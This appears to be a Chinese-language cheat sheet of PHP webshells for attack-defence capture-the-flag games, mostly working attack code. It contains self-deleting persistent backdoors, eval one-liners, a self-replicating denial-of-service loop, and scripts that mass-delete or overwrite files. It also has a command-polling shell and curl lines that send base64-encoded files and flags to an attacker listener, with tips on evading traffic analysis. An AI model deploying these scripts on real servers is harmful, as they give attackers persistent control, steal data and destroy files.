# Webshell

## Interesting.php

```php
<?php
session_start();
extract($_GET);
if(preg_match('/[0-9]/',$_SESSION['PHPSESSID']))
                   exit;
if(preg_match('/\/|\./',$_SESSION['PHPSESSID']))
                   exit;
include(ini_get("session.save_path")."/sess_".$_SESSION['PHPSESSID']);
?>
```

通过xxx.php?_SESSION['name']=<?php phpinfo();?>

xxx.php?_SESSION['name']=<?php system("ls ./");?>来操控

主要原理是extract可以变量覆盖，导致我们可以控制PHPSESSID变量，而该变量会保存include(ini_get("session.save_path")."/sess_".$_SESSION['PHPSESSID']);在这个路径下。

![interesting](interesting.png)

所以，既然我们可控session就能控制这个路径下文件的内容，最终达成任意代码执行的效果。注意：有些服务器会配置session文件内容不可include？就是不可读（我的mac就这样），那么该攻击就失效了。

## nodie.php

```php
<?php
#光回传flag
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
while (true) {
    $x = file_get_contents('/Users/moxiaoxi/Desktop/1.txt');
	file_get_contents('http://127.0.0.1:20002/test.php?zmkm=qqq&qqq='.$x);
    sleep(1);
}
?>
```

猥琐回传式不死马，/Users/moxiaoxi/Desktop/1.txt 应该为flag的绝对地址，然后通过file_get_contents函数回传到我们的服务器或者攻击机上。



## nuclear_bomb.php

```php
<?php

    set_time_limit(0);

    ignore_user_abort(true);

    while(1){

        file_put_contents(randstr().’.php’,file_get_content(__FILE__));

        file_get_contents(“http://127.0.0.1/“);

    }
/*
根据代码，不难看出这个脚本的功能。

常驻内存之后，进入死循环。

循环内部是实现无效複製自身并且访问web服务的功能。

执行的后果就是内存爆炸，php就GG了，严重点的话，Docker也GG。*/
```



## Del.php

```php
<?php

    set_time_limit(0);

    ignore_user_abort(1);

    array_map('unlink', glob("some/dir/*.php"));

?>
```

批量删除some/dir/*.php文件



## del_or_change.php

```php
<?php

    set_time_limit(0);

    ignore_user_abort(1);

    unlink(__FILE__);

    function getfiles($path){

        foreach(glob($path) as $afile){

            if(is_dir($afile))

                getfiles($afile.'/*.php');

            else

                @file_put_contents($afile,”#Anything#”);

                //unlink($afile);

        }

    }

    while(1){

        getfiles(__DIR__);

        sleep(10);

    }

?>
```

批量删除或者写文件



## weisuonodie.php

```php
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
$interval =30;
while (true) {
	$fp = fopen('./language.php','a');
	fwrite($fp,'<?php @eval($_POST['Pegasus']);?>';
	fclose($fp);
	sleep($interval);
}
?>
	
```

一直写language.php,里面是一个简单的一句话木马。访问language.php即可



## Yijuhua.php

```php
<?php
$serverList = array(
    "127.0.0.1",
    "::1"
);
$ip = $_SERVER['REMOTE_ADDR'];

foreach ($serverList as $host){
    if( $ip===$host){
		$a = $_POST['n985de9'];
		if(isset($a)) {
    		eval(base64_decode($a));
		}
    }else{
        die();
    }
}
```

仅能自己用的一句话木马，用于权限维持和运维。





## 最猥琐

回传式命令执行

1. 首先，先给对方种一个不死马

   ```php
   <?php
   unlink($_SERVER['SCRIPT_FILENAME']);
   ignore_user_abort(true);
   set_time_limit(0);

   while (true) {
       $str = file_get_contents('http://localhost/429/index.php');
       system($str);
       sleep(10);
   }
   ?>
   ```

   http://localhost/429/index.php 是你控制的服务器上的一个文件，里面的内容为需要执行的系统命令

2. index.php的内容可以为

   ```php
   curl http://localhost:3333/429/`base64 -i $(ls ./)`
   ```

   或者

   ```
   curl http://localhost:3333/429/`base64 -i ./test.txt`
   ```

   http://localhost:3333/429/ 为你可以控制的服务器。我们监听3333端口获取数据。将获得的flag数据base64一下返回，防止流量分析。





## 最简单

```php
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
while (true) {
	system("curl 172.16.100.5:9000/submit_flag/ -d 'flag='$(cat /home/njweb/flag/flag)'&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY");
    sleep(10);
}
?>
```

直接在对方服务器上提交，不交互